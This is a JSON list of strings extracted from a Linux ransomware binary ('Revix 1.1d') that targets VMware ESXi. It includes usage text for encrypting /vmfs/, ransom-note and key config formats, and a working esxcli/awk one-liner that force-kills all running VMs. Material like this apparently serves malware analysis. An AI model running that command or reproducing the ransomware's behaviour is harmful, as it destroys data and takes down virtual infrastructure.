{
    "strings_utf16": [],
    "strings": [
        ".dynstr",
        "llocatioH",
        "Error no json file!",
        "pthread_mutex_lock",
        ".dynsym",
        "%d:%d: Expected , before \"",
        "GCC: (Ubuntu 4.8.4-2ubuntu1~14.04.4) 4.8.4",
        "Without --path - it encrypts current dir",
        "fwrite",
        "Unexpected EOF in string (at %d:%d)",
        "pthread_mutex_init",
        "Unable to find path argument",
        "Error parse cfg",
        ".note.ABI-tag",
        ".rela.dyn",
        "%d:%d: Expected , before %c",
        "spsize",
        "_Jv_RegisterClasses",
        "Memory aH",
        "iji iji iji iji ij|- - - - - -|ji iji ifi iji iji iji",
        "libpthread.so.0",
        "Error decoding sub_id %d",
        "iji iji iji iji ij'___________'ji iji ifi iji iji iji",
        "strstr",
        "rdmcnt",
        "abc:d:f:",
        "perror",
        "expand 32-byte kexpand 16-byte k",
        "--silent (-s) use for not stoping VMs mode",
        "[%s] already encrypted",
        "%d:%d: Unexpected `%c` in object",
        "pthread_cond_wait",
        "fatal error, no cfg!",
        "opendir",
        "pthread_timedjoin_np",
        "stderr",
        "%d:%d: Trailing garbage: `%c`",
        "strcmp",
        "snprintf",
        "memset",
        "strcat",
        "readdir",
        "%d:%d: Unknown value",
        "{\"ver\":%d,\"pid\":\"%s\",\"sub\":\"%s\",\"pk\":\"%s\",\"uid\":\"%s\",\"sk\":\"%s\",\"os\":\"%s\",\"ext\":\"%s\"}",
        "pthread_cond_signal",
        ".fini_array",
        "%d:%d: Unexpected EOF in block comment",
        "pkill -9 %s",
        ".gnu.hash",
        "strchr",
        "ftell",
        "sprintf",
        "__ctype_b_loc",
        "%d:%d: Expected digit after `.`",
        "libc.so.6",
        ".dynamic",
        "pthread_exit",
        "iji iji iji iji ij|  %08d |ji iji ifi iji iji iji",
        "Error open urandm line %d!",
        "File is encrypted by data %s",
        "n failurH",
        "CCCCDDDD",
        "debug",
        "%d:%d: Too long (caught overflow)",
        "%d:%d: Unexpected `0` before `%c`",
        "%d:%d: Unexpected `%c` in comment opening sequence",
        ".rela.plt",
        "popen",
        ".data",
        "strcpy",
        "threads",
        "File error",
        "_ITM_deregisterTMCloneTable",
        "Path: %s",
        "_ITM_registerTMCloneTable",
        "File [%s] was NOT encrypted",
        "chmod",
        ".init",
        "__libc_start_main",
        "toupper",
        "linux",
        "pthread_create",
        "fopen",
        "strncpy",
        ".gnu.version",
        "usleep",
        "Error decoding master_pk %d",
        "silent",
        "%d:%d: Expected digit after `e`",
        "/dev/urandom",
        "rand: try to read %hu but get %lu bytes",
        "Error decoding note_body %d",
        "%d:%d: EOF unexpected",
        "strdup",
        "%d:%d: Unexpected %c when seeking value",
        "6malloc",
        "SbEwd",
        "Using silent mode, if you on esxi - stop VMs manualy",
        ".comment",
        "%d:%d: Unexpected ]",
        "pthread_cond_broadcast",
        "Error decoding user_id %d",
        "iji iji iji iji ij|   FILES   |ji iji ifi iji iji iji",
        "pthread_mutex_unlock",
        "json.txt",
        "Revix 1.1d",
        "killing %s",
        "Unknown H",
        "!!!BY DEFAULT THIS SOFTWARE USES 50 THREADS!!!",
        "errof",
        "/lib64/ld-linux-x86-64.so.2",
        "GLIBC_2.2.5",
        ".shstrtab",
        "libm.so.6",
        "%d:%d: Expected digit before `.`",
        ".eh_frame_hdr",
        "rename",
        "malloc",
        "C77nYmm",
        "esxcli --formatter=csv --format-param=fields==\"WorldID,DisplayName\" vm process list | awk -F \"\\\"*,\\\"*\" '{system(\"esxcli vm process kill --type=force --world-id=\" $1)}'",
        "Encrypting [%s]",
        "fread",
        "uname -a && echo \" | \" && hostname",
        "iji iji iji iji ij.-----------.ji iji ifi iji iji iji",
        "iji iji iji iji ij| ENCRYPTED |ji iji ifi iji iji iji",
        "Invalid character value `%c` (at %d:%d)",
        ".interp",
        "fatal error,master_pk size is bad %lu",
        "strlen",
        "[%s] is protected by os",
        "nbody",
        ".init_array",
        "fseek",
        "%d:%d: Expected : before %c",
        ".text",
        ".fini",
        "rewind",
        ".note.gnu.build-id",
        "Error read urandm line %d!",
        "optarg",
        ".rodata",
        "fatal error malloc enc",
        ".got.plt",
        "Usage example: elf.exe --path /vmfs/ --threads 5",
        "closedir",
        "Key inizialization error ... something wrong with config",
        "FFFFWWWW",
        "calloc",
        "iji iji iji iji iji iji tYiji iji iji ifi iji iji iji",
        "%d:%d: Comment not allowed here",
        "getopt_long",
        "pthread_cond_init",
        "__gmon_start__",
        ".gnu.version_r",
        "GLIBC_2.3.2",
        "GLIBC_2.3.3",
        "File [%s] was encrypted",
        ".eh_frame",
        "GLIBC_2.3",
        "Error create note in dir %s"
    ]
}